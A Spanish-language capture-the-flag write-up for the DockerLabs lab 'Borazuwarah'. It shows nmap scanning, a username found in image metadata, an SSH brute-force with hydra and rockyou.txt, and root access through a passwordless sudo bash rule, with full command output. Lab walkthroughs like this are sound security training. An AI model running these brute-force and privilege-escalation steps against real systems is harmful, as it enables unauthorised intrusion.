<section align="center">

# 💥Borazuwarah Write Up💥

![Dificultad](https://img.shields.io/badge/Dificultad-Muy%20Facil-green?style=for-the-badge)
![Plataforma](https://img.shields.io/badge/Plataforma-DockerLabs-blue?style=for-the-badge)

</section>

## 🚀 Despliegue

Una vez descargado el ctf, lo extreamos e iniciamos la maquina con:

```bash
sudo bash borazuwarahctf/auto_deploy.sh borazuwarahctf/borazuwarahctf.tar
```

nos devuelve esto:

```bash
	                    ##        .         
	              ## ## ##       ==         
	           ## ## ## ##      ===         
	       /""""""""""""""""\___/ ===       
	  ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
	       \______ o          __/           
	         \    \        __/            
	          \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
				     
Se han detectado máquinas de DockerLabs previas, debemos limpiarlas para evitar problemas, espere un momento...
Se han detectado máquinas de DockerLabs previas, debemos limpiarlas para evitar problemas, espere un momento...

Estamos desplegando la máquina vulnerable, espere un momento.
La red dockernetwork ya existe. Eliminándola y recreándola...

Máquina desplegada, su dirección IP es --> 172.17.0.4

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

## 🔍Escaneo y enumeracion

para empezar con el ctf, realizamos un escaneo general con nmap:

```bash
nmap -p- 172.17.0.4
```

### 🛠️Parametros usados

| Parametro | Descripcion |
| :--- | :--- |
| **`-p-`** | indico que quiero un escaneo para todos los puertos, no solo los mas comunes |

nos devuelve esto:

```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-08 18:55 -03
Nmap scan report for 172.17.0.4
Host is up (0.00020s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 2.71 seconds
```

como podemos ver, el puerto 22 y 80 estan abiertos, realizamos un analisis para saber si hay informacion en la web y encontramos una imagen, en el codigo fuente no hay informacion asi que intentaremos analizar los metadatos de la imagen.

Descargamos la imagen y accedemos a la web "https://exif.tools/", y subimos la imagen.

obtenemos:

```bash
Description	---------- User: borazuwarah ----------
Title	---------- Password: ----------
```

Como podemos ver, tenemos un usuario en los metadatos, podemos realizar un ataque de fuerza bruta al puerto ssh para obtener acceso:

```bash
hydra -l borazuwarah -P rockyou.txt ssh://172.17.0.4
```

obtenemos:

```bash
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-02-08 19:02:42
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking ssh://172.17.0.4:22/
[22][ssh] host: 172.17.0.4   login: borazuwarah   password: 123456
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-02-08 19:02:57
```

nos conectamos:

```bash
ssh borazuwarah@172.17.0.4
```

obtenemos:

```bash
The authenticity of host '172.17.0.4 (172.17.0.4)' can't be established.
ED25519 key fingerprint is SHA256:O4p1roi1VxgJcCkT8eG0qxAP8LkcGMNNNg1H/7HISvg.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes 
Warning: Permanently added '172.17.0.4' (ED25519) to the list of known hosts.
borazuwarah@172.17.0.4's password: 
Linux 9d5d0f2a7fc9 6.14.0-29-generic #29~24.04.1-Ubuntu SMP PREEMPT_DYNAMIC Thu Aug 14 16:52:50 UTC 2 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
```

ahora como somos usuario borazuwarah, nuestro siguiente objetivo es ser usuario root, para ello, verificamos si hay alguna vulnerabiladad para realizar una escalada de privilegios con el siguiente comando:

```bash
sudo -l
```

obtenemos:

```bash
Matching Defaults entries for borazuwarah on 9d5d0f2a7fc9:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User borazuwarah may run the following commands on 9d5d0f2a7fc9:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: /bin/bash
```

esto quiere decir, que tenemos permisos para ejecutar bash como administrador, podemos realizar una escalada de privilegios desde ahi:

```bash
sudo bash
```

obtenemos:

```bash
root@9d5d0f2a7fc9:/home/borazuwarah# whoami
root
root@9d5d0f2a7fc9:/home/borazuwarah# 
```